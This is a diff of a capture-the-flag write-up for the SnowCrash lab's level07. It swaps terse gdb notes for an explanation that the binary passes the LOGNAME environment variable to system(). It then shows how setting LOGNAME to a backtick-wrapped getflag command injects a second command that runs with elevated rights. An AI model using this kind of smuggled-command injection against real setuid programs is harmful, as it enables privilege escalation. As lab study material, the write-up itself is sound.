@@ -1,14 +1,16 @@
-# LEVEL 07
+# LEVEL07
 
-    $> scp -P 4242 level07@<ip-addr> level07
+ltrace on the executable 
 
-gdb level07
-disassemble main
-get the asm
-its the same shit as level04
+    level07@SnowCrash:~$ ltrace ./level07
 
-x/s address above the <getenv@plt>
-outputs 'LOGNAME"
+Will output a pattern similar to the one encounter on level04.
+The program prints the environment variable "LOGNAME" via a call to system("/bin/echo logname")
 
+Just like in level04, ls-la will show that flag07 has specific permissions, all we have to do is switch the LOGNAME env value with our getflag excecutable like so:
 
+    level07@SnowCrash:~$ export LOGNAME='`getflag`'
+And then launch the executable.
+
+    ./level07
 
